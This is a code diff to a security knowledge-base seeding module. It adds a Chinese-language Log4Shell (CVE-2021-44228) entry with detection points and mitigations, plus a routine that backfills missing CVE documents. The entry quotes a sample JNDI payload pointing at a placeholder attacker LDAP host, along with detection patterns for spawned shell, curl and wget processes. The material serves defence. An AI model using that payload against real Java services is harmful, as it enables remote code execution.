@@ -856,6 +856,27 @@ SEED_KNOWLEDGE = [
     # 漏洞分类与处置指南
     # ════════════════════════════════════════════
     {
+        "title": "Log4Shell (CVE-2021-44228)",
+        "content": """CVE-2021-44228（Log4Shell / Apache Log4j2）是可远程利用的 JNDI 注入漏洞。
+攻击者在日志字段中写入 ${jndi:ldap://attacker/a}，受害 Java 进程向恶意 LDAP 发起请求并加载远程类，导致 RCE。
+别名: Log4Shell、Log4j RCE、CVE-2021-44228、CVE-2021-45046。
+检测要点:
+1. HTTP Header / User-Agent / URI 含 ${jndi:ldap 或 ${jndi:rmi
+2. 出站 LDAP/RMI 连接到非常用端口
+3. Java 进程突然拉起 shell / curl / wget
+4. 日志中出现 jndi:ldap:// 或 log4j2 报错后的异常子进程
+缓解:
+1. 升级 log4j-core 到 2.17.1+（CVE-2021-44228 / 45046 修复）
+2. 设置 log4j2.formatMsgNoLookups=true
+3. 边界拦截 jndi:ldap 特征
+4. 限制应用服务器出站 LDAP
+相关 ATT&CK: T1190 面向公网应用利用, T1059 命令执行。""",
+        "source": "cve",
+        "threat_types": ["WEB_ATTACK"],
+        "severity": "critical",
+        "tags": ["cve-2021-44228", "log4shell", "log4j", "jndi", "rce"],
+    },
+    {
         "title": "漏洞严重度分级与处置时效",
         "content": """漏洞严重度分级与处置时效:
 
@@ -929,7 +950,8 @@ async def seed_knowledge_base(session: AsyncSession):
     )).scalar() or 0
 
     if count > 10:
-        logger.info(f"Knowledge base already seeded ({count} chunks), skipping")
+        logger.info(f"Knowledge base already seeded ({count} chunks), ensuring CVE seeds")
+        await _ensure_missing_seed_docs(session)
         return
 
     logger.info(f"Seeding knowledge base with {len(SEED_KNOWLEDGE)} documents...")
@@ -957,6 +979,7 @@ async def seed_knowledge_base(session: AsyncSession):
             tags=doc_data["tags"],
         )
 
+        from rag.lexical import build_search_lex
         for chunk_data in chunks:
             chunk = KnowledgeChunk(
                 doc_id=chunk_data["doc_id"],
@@ -969,12 +992,65 @@ async def seed_knowledge_base(session: AsyncSession):
                 tags=doc_data["tags"],
                 embedding=None,  # 占位不由这里写入(None → 由 seed 后受管回填按实际维度算)
                 token_count=chunk_data["token_count"],
+                search_lex=build_search_lex(
+                    doc_data["title"], chunk_data["content"], doc_data["threat_types"],
+                ),
             )
             session.add(chunk)
             total_chunks += 1
 
     await session.commit()
     logger.info(f"Knowledge base seeded: {len(SEED_KNOWLEDGE)} documents, {total_chunks} chunks")
+
+
+async def _ensure_missing_seed_docs(session: AsyncSession):
+    """已播种库补插 CVE 等后加文档（不依赖整库重置）。"""
+    from models import KnowledgeDoc, KnowledgeChunk
+    from rag.lexical import build_search_lex
+
+    for doc_data in SEED_KNOWLEDGE:
+        title = doc_data.get("title") or ""
+        if "CVE-" not in title:
+            continue
+        exists = (await session.execute(
+            select(KnowledgeDoc.id).where(KnowledgeDoc.title == title)
+        )).scalar()
+        if exists:
+            continue
+        doc = await kb_manager.add_document(
+            session=session,
+            title=title,
+            content=doc_data["content"],
+            source=doc_data["source"],
+            threat_types=doc_data["threat_types"],
+            severity=doc_data["severity"],
+            tags=doc_data["tags"],
+        )
+        chunks = security_chunker.chunk_document(
+            doc_id=doc["id"],
+            title=title,
+            content=doc_data["content"],
+            source=doc_data["source"],
+            threat_types=doc_data["threat_types"],
+            severity=doc_data["severity"],
+            tags=doc_data["tags"],
+        )
+        for chunk_data in chunks:
+            session.add(KnowledgeChunk(
+                doc_id=chunk_data["doc_id"],
+                chunk_id=chunk_data["chunk_id"],
+                content=chunk_data["content"],
+                title=title,
+                source=doc_data["source"],
+                threat_types=doc_data["threat_types"],
+                severity=doc_data["severity"],
+                tags=doc_data["tags"],
+                embedding=None,
+                token_count=chunk_data["token_count"],
+                search_lex=build_search_lex(title, chunk_data["content"], doc_data["threat_types"]),
+            ))
+        await session.commit()
+        logger.info(f"Seeded missing CVE doc: {title}")
 
     # 受管后台回填（持有任务引用, 不被 GC 取消）。新开独立 session, 不复用已提交的短命 session。
     launch_embedding_backfill()
